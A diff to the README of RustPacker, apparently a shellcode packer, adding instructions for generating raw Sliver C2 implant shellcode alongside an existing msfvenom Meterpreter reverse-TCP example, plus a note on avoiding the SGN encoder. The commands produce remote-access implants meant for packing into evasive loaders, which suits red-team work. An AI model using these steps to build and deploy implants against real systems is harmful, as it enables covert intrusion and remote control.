@@ -50,6 +50,11 @@ RustPacker is compatible with any "raw" shellcode.
 You can generate raw MSF shellcode using msfvenom's raw format. Ex:
 - `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.bin`
 
+### Sliver
+You can generate raw [Sliver](https://github.com/BishopFox/sliver) shellcode using Sliver's "--format shellcode". Ex:
+- `generate --mtls 127.0.0.1:443 --format shellcode --windows`
+- Do not use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates do not use RWX memory regions, which are required for SGN to work.
+
 ## Todo
 - [X] Port createThread Rust template
 - [X] Port createRemoteThread Rust template
